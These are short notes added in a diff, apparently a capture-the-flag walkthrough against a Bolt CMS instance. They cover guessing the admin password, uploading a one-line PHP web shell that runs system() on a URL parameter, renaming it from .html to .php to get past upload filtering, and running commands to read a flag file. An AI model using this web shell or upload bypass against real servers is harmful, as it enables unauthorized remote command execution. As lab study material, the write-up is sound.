@@ -1,0 +1,17 @@
+sourse code we found bolt
+
+{url}/bolt/login
+
+wild guess admin password
+
+Now you need to go to file management to see if you can upload some malicious files
+
+create vulnerable file
+<?php echo system($_GET['cmd']);?>
+
+Try to upload as .html
+When you click to the file, it starts editing
+Go to options and rename the rce.html file to rce.php
+
+Add cmd to the url/files/rce.php?cmd=cat /flag.txt
+
